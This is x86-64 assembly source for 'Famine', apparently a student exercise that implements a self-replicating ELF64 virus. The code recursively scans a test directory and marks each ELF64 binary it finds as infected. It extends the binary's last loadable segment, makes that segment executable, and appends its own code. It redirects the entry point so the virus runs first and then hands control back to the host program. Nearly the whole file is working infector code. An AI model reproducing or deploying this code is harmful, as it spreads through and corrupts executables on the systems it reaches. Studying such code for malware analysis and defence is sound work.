%include "src/famine.inc"

BITS 64
default rel

section .text
	global _start

; %rdi %rsi %rdx %r10 %r8 %r9

_start:
	PUSH_ALL
	jmp		end_
print_rax:

    PUSH_ALL

    ; Utilisation d’un buffer sur la pile
    sub     rsp, 32             ; réserver 32 bytes
    lea     rsi, [rsp + 32]     ; rsi = fin du buffer
    mov     rcx, 0              ; compteur de caractères
    mov     rbx, rax            ; backup rax dans rbx

.convert:
    xor     rdx, rdx
    mov     rax, rbx
    mov     rdi, 10
    div     rdi                ; rax = rbx / 10, rdx = reste
    dec     rsi
    add     dl, '0'
    mov     [rsi], dl
    mov     rbx, rax
    inc     rcx
    test    rax, rax
    jnz     .convert

    ; Affichage
    mov     rax, 1              ; syscall write
    mov     rdi, 1              ; stdout
    mov     rdx, rcx            ; taille
    syscall

    add     rsp, 32             ; restaurer la pile
    POP_ALL
    ret

	buff	times 4096 db 0
	newl	times 0001 db 0xa
	path	db '/root/famine/test_dir/', 0
	padd	times 0512 db 0
	file	db 'elf64 found!', 0
	self	db '/proc/self/exe', 0
	msg1	db 'Famine version 1.0 (c)oded by alexafer-jdecorte', 0
	last	db '..', 0
	curr	db '.', 0
	elfh	db 0x7f, 'ELF'
	one		db 1
	zero	db 0
	entry	dq 0
	exec	dw 7
	old_entry		   dq 0
	new_entry		   dq 0
	elfb	times 0064 db 0
	elfp0	times 0056 db 0
	elfp1	times 0056 db 0




	printf: ; lea rsi
		push	rax
		push	rcx
		push	rsi
		push	rdi
		push	rdx
		xor		rdx, rdx
		.loop:
			lodsb		; al <- [rsi], rsi++
			inc		rdx
			test	al, al
			je		.done
			jmp		.loop
		.done:
			sub		rsi, rdx
			mov		rax, SYS_write
			mov		rdi, 1
			syscall
			mov		rax, SYS_write
			mov		rdi, 1
			lea		rsi, [rel newl]
			mov		rdx, 1
			syscall
		pop		rdx
		pop		rdi
		pop		rsi
		pop		rcx
		pop		rax
	ret

	sub_val:	; lea rsi
		push	rax
		push	rcx
		push	rsi
		push	rdi
		push	rdx
		.loop:
			lodsb		; al <- [rsi], rsi++
			inc		rdx
			test	al, al
			je		.done
			jmp		.loop
		.done:
			cmp		rdx, 3
			jle		.finish
			std		 ; sens inverse pour lodsb
			mov		[rsi - 2], byte 0
			.second_loop:
				lodsb
				cmp		al, '/'
				je		.second_done
				mov		[rsi + 1], byte 0
				jmp		.second_loop
			.second_done:
			cld
		.finish:
		pop		rdx
		pop		rdi
		pop		rsi
		pop		rcx
		pop		rax
	ret

	add_val:	; lea rsi [le path], lea rdi val ajoutee
		push	rax
		push	rcx
		push	rsi
		push	rdi
		push	rdx
		push	r12

		mov		r12, rax
		xor		rcx, rcx
		xor		rdx, rdx
		.loop:
			lodsb
			test	al, al
			je		.done
			inc		rdx
			jmp		.loop
		.done:
			dec		rsi
			xchg	rsi, rdi
			.second_loop:
				lodsb
				inc		rcx
				test	al, al
				je		.second_done
				jmp		.second_loop
			.second_done:
				sub		rsi, rcx
				mov		rax, rcx
				rep		movsb
				xchg	rsi, rdi

				cmp		r12, 4
				jne		.file
				mov		[rsi - 1], byte '/'
				mov		[rsi], byte 0
				.file:
				sub		rsi, rax
				sub		rsi, rdx
		pop		r12
		pop		rdx
		pop		rdi
		pop		rsi
		pop		rcx
		pop		rax
	ret

	famine:
		push	r12
		push	rax
		push	rcx
		push	rsi
		push	rdi
		push	rdx

		lea		rsi, [rel path]
		call	printf
		lea		rdi, [rel buff]
		mov		rcx, 512
		xor		rax, rax
		rep		stosq

		mov		rax, SYS_openat
		mov		rdi, AT_FDCWD
		lea		rsi, [rel path]
		xor		rdx, rdx
		xor		r10, r10
		syscall
		mov		r12, rax
		mov		rdi, rax
		push	rdi

	;SYS_getdents64
	;struct linux_dirent64 {
    ;ino64_t        d_ino;     // 8 bytes : numéro d'inode
    ;off64_t        d_off;     // 8 bytes : offset du prochain dirent
    ;unsigned short d_reclen;  // 2 bytes : taille de cette entrée
    ;unsigned char  d_type;    // 1 byte  : type de fichier
    ;char           d_name[];  // nom du fichier (null-terminated)
	;};

		mov		rax, SYS_getdents64
		lea		rsi, [rel buff]
		mov		rdx, 4096
		syscall
		mov		rdx, rax
		xor		rdi, rdi
		.loop:
			cmp		rdx, rdi
			jle		.done

			add		rdi, 16
			push	rbx
			lea		rbx, [rel buff]
			movzx	rcx, word [rbx + rdi]
			add		rdi, 2
			movzx	rax, byte [rbx + rdi]
			pop		rbx
			add		rdi, 1
			sub		rcx, 19
			add		rdi, rcx
			add		rsi, 19

			cmp		rax, 4
			jne		.file
			push	rsi
			push	rcx
			push	rdi
			mov		rcx, 2
			lea		rdi, [rel curr]
			repe	cmpsb
			pop		rdi
			pop		rcx
			pop		rsi
			je		.no_print
			push	rsi
			push	rcx
			push	rdi
			mov		rcx, 3
			lea		rdi, [rel last]
			repe	cmpsb
			pop		rdi
			pop		rcx
			pop		rsi
			je		.no_print
			; Ici seulement les files


			push	rdi
			push	rsi
			push	rax
			lea		rdi, [rel path]
			xchg	rsi, rdi
			call	add_val
			pop		rax
			pop		rsi
			pop		rdi


			call	famine

			push	rsi
			lea		rsi, [rel path]
			call	sub_val
			pop		rsi

			push	rax
			push	rcx
			push	rsi
			push	rdi
			push	rdx
			lea		rdi, [rel buff]
			mov		rcx, 512
			xor		rax, rax
			rep		stosq

			mov		rax, SYS_close
			mov		rdi, r12
			syscall

			mov		rax, SYS_openat
			mov		rdi, AT_FDCWD
			lea		rsi, [rel path]
			xor		rdx, rdx
			xor		r10, r10
			syscall

			mov		rdi, rax
			mov		rax, SYS_getdents64
			lea		rsi, [rel buff]
			mov		rdx, 4096
			syscall
			pop		rdx
			pop		rdi
			pop		rsi
			pop		rcx
			pop		rax

			jmp		.no_print
		.file:
			;call	printf ;logique des fichier




			push	rdi
			push	rsi
			push	rax
			lea		rdi, [rel path]
			xchg	rsi, rdi
			call	add_val
			pop		rax
			pop		rsi
			pop		rdi

			;call	printf

			call	virus






			; ici logique des fichier
		.no_print:
			add		rsi, rcx
			jmp		.loop
		.done:


		pop		rdi
		mov		rax, SYS_close
		syscall
		pop		rdx
		pop		rdi
		pop		rsi
		pop		rcx
		pop		rax
		pop		r12
	ret


	virus:		; rsi nom du fichier
		PUSH_ALL


		mov		rax, SYS_open
		lea		rdi, [rel path]
		mov		rsi, 2
		xor		rdx, rdx
		syscall

		lea		rsi, [rel path]
		call	sub_val

		cmp		rax, 0
		jle		.return
		mov		r12, rax

		lea		rdi, [rel elfb]	; Cleaning du buffer elfb -> La ou y va avoir le elf header
		mov		rcx, 8
		xor		rax, rax
		rep		stosq

		lea		rdi, [rel elfp0]	; Cleaning du buffer elfp0
		mov		rcx, 7
		xor		rax, rax
		rep		stosq

		lea		rdi, [rel elfp1]	; Cleaning du buffer elfp1
		mov		rcx, 7
		xor		rax, rax
		rep		stosq

		mov		rax, SYS_read
		mov		rdi, r12
		lea		rsi, [rel elfb]
		mov		rdx, 64
		syscall
		; START - CHECKS - ELF64
		mov		rcx, 4
		lea		rsi, [rel elfh]
		lea		rdi, [rel elfb]
		repe	cmpsb
		test	rcx, rcx
		jnz		.close_file		; On verifie le nombre magique

		cmp		byte [rel elfb + 4], 2	; On verifie que c'est bien un elf64
		jne		.close_file

		mov		al, [rel elfb + 0xa]	; Check si deja infecte
		test	al, al
		jnz		.close_file
		; END - CHECKS - ELF64

		mov		rax, [rel elfb + 0x18]
		mov		[old_entry], rax

		movzx	rcx, word [rel elfb + 0x38]
		movzx	rdi, word [rel elfb + 0x36]
		xor		r11, r11
		xor		r10, r10

		.start_loop_phdr:
			test	rcx, rcx
			jz		.end_loop_phdr
			mov		r10, rcx
			imul	r10, rdi
			add		r10, 64
			push	r11
			push	rcx
			push	rdi
			mov		rdi, r12
			mov		rdx, 0x38
			lea		rsi, [rel elfp0]
			mov		rax, SYS_pread64
			syscall
			pop		rdi
			pop		rcx
			pop		r11
			; r9 -> target_phdr offset
			cmp		dword [rel elfp0], 1 ; est-ce un load ?
			jne		.next_it_phdr
			mov		rax, qword [rel elfp0 + 0x08]  ; p_offset
			add		rax, qword [rel elfp0 + 0x20] ; p_filesz

			cmp		rax, r11
			jna		.next_it_phdr
			mov		r11, rax
			mov		r9, r10

			push	r11
			push	rcx
			push	rdi
			mov		rdi, r12
			mov		rdx, 0x38
			lea		rsi, [rel elfp1]
			mov		rax, SYS_pread64
			syscall
			pop		rdi
			pop		rcx
			pop		r11


		.next_it_phdr:
			dec		rcx
			jmp		.start_loop_phdr
		.end_loop_phdr:
			test	r11, r11
			jz		.close_file

			push	r9
			push	r11
			mov		rax, SYS_pwrite64
			mov		rdi, r12
			lea		rsi, [rel one]
			mov		rdx, 1
			mov		r10, 0xa
			syscall
			pop		r11
			pop		r9


			push	r11
			mov		rax, [rel elfp1 + 0x8]
			sub		r11, rax
			mov		rax, [rel elfp1 + 0x10]
			add		r11, rax
			mov		[rel entry], r11
			pop		r11


			push	r9
			push	r11
			mov		rax, SYS_pwrite64
			mov		rdi, r12
			lea		rsi, [rel entry]
			mov		rdx, 8
			mov		r10, 0x18
			syscall
			pop		r11
			pop		r9

			push	r9
			push	r11
			mov		rax, SYS_pwrite64
			mov		rdi, r12
			lea		rsi, [rel exec]
			mov		rdx, 4
			mov		r10, r9
			add		r10, 0x4
			syscall
			pop		r11
			pop		r9

			push	r11
			lea		rdi, [rel _start]
			lea		r11, [rel end_addr]
			sub		r11, rdi

			mov		rdi, [rel elfp1 + 0x20]
			add		rdi, r11
			mov		[rel elfp1 + 0x20], rdi

			lea		rdi, [rel _start]
			lea		r11, [rel end_addr]
			sub		r11, rdi

			mov		rdi, qword [rel elfp1 + 0x28]
			add		rdi, r11
			mov		[rel elfp1 + 0x28], rdi
			pop		r11

			push	r9
			push	r11
			mov		rax, SYS_pwrite64
			mov		rdi, r12
			lea		rsi, [rel elfp1 + 0x20]
			mov		rdx, 8
			mov		r10, r9
			add		r10, 0x20
			syscall
			pop		r11
			pop		r9

			push	r9
			push	r11
			mov		rax, SYS_pwrite64
			mov		rdi, r12
			lea		rsi, [rel elfp1 + 0x28]
			mov		rdx, 8
			mov		r10, r9
			add		r10, 0x28
			syscall
			pop		r11
			pop		r9

			push	r11
			push	r9
			lea		rsi, [rel _start]
			lea		rdx, [rel end_addr]
			sub		rdx, rsi
			mov		r10, r11
			mov		rdi, r12
			mov		rax, SYS_pwrite64
			syscall
			pop		r9
			pop		r11


	.close_file:
		mov		rax, SYS_close
		mov		rdi, r12
		syscall
	.return:
		POP_ALL
	ret

end_:

	mov		rax, [rel entry]
	mov		[rel new_entry], rax

	call	famine

	mov		rax, SYS_open
	lea		rdi, [rel self]
	xor		rsi, rsi
	xor		rdx, rdx
	syscall
	cmp		rax, 0
	jle		.just_quit
	mov		r12, rax

	mov		rax, SYS_pread64
	mov		rdi, r12
	lea		rsi, [rel zero]
	mov		rdx, 1
	mov		r10, 10
	syscall


	mov		rax, SYS_close
	mov		rdi, r12
	syscall



.just_quit:
	POP_ALL

	mov		al, BYTE [rel zero]
	test	al, al
	jz		.exit_ret

	mov		rax, [rel new_entry]
	sub		rax, [rel old_entry]
	lea		rdi, [rel _start]
	sub		rdi, rax
	jmp		rdi

.exit_ret:

	mov		rax, SYS_exit
	xor		rdi, rdi
	syscall
end_addr:
